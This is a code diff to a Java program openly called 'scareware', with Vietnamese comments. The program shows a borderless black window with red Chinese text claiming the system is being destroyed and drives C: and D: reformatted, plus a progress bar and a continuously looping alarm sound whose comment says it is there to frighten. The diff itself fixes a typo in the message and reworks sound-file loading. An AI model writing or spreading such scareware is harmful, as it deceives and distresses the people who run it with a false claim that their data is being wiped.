@@ -1,14 +1,17 @@
+package src;
 import javax.swing.*;
 import java.awt.*;
 import java.awt.event.*;
-import java.io.File;
+import java.io.BufferedInputStream;
+import java.io.InputStream;
+
 import javax.sound.sampled.*;
 
 public class scareware {
     private static boolean isRunning = true;
 
     public static void main(String[] args) {
-        playWarningSound("warning.wav"); 
+        playWarningSound("/src/warning.wav"); 
 
         JFrame frame = new JFrame();
         frame.setUndecorated(true);
@@ -18,7 +21,7 @@ public class scareware {
         frame.getContentPane().setBackground(Color.BLACK);
         frame.setLayout(new GridBagLayout());
         // 1. GIAO DIỆN NGƯỜI DÙNG
-        JLabel label = new JLabel("<html><center><h1 style='color:red; font-size:40px;'>警告！H這個系統正在被摧毀</h1>"
+        JLabel label = new JLabel("<html><center><h1 style='color:red; font-size:40px;'>警告！這個系統正在被摧毀</h1>"
                 + "<p style='color:white;'>正在重新格式化整個 C:\\ 和 D:\\ 磁碟機…</p></center></html>");
         
         JProgressBar pb = new JProgressBar(0, 100);
@@ -93,22 +96,37 @@ public class scareware {
         timer.start();
     }
 
-    public static void playWarningSound(String filePath) {
-        new Thread(() -> {
-            try {
-                File soundFile = new File(filePath);
-                if (!soundFile.exists()) {
-                    System.out.println("Không tìm thấy file: " + filePath);
-                    return;
-                }
-                AudioInputStream audioInputStream = AudioSystem.getAudioInputStream(soundFile.getAbsoluteFile());
-                Clip clip = AudioSystem.getClip();
-                clip.open(audioInputStream);
-                clip.loop(Clip.LOOP_CONTINUOUSLY);
-                clip.start();
-            } catch (Exception e) {
-                System.out.println("Lỗi âm thanh: " + e.getMessage());
+public static void playWarningSound(String fileName) {
+    new Thread(() -> {
+        try {
+            // Thử tìm ở gốc (root) của ClassLoader
+            InputStream audioSrc = scareware.class.getResourceAsStream("/" + fileName);
+            
+            // Nếu không thấy, thử tìm bên trong folder src (theo package của mày)
+            if (audioSrc == null) {
+                audioSrc = scareware.class.getResourceAsStream("/src/" + fileName);
             }
-        }).start();
-    }
+            
+            // Nếu vẫn không thấy, thử tìm trực tiếp trong cùng folder với class
+            if (audioSrc == null) {
+                audioSrc = scareware.class.getResourceAsStream(fileName);
+            }
+
+            if (audioSrc == null) {
+                System.out.println("Lỗi: Không tìm thấy file " + fileName + " ở bất cứ đâu!");
+                return;
+            }
+
+            InputStream bufferedIn = new BufferedInputStream(audioSrc);
+            AudioInputStream audioStream = AudioSystem.getAudioInputStream(bufferedIn);
+            
+            Clip clip = AudioSystem.getClip();
+            clip.open(audioStream);
+            clip.loop(Clip.LOOP_CONTINUOUSLY); // Hú liên tục cho sợ
+            clip.start();
+        } catch (Exception e) {
+            System.out.println("Lỗi âm thanh: " + e.getMessage());
+        }
+    }).start();
+}
 }
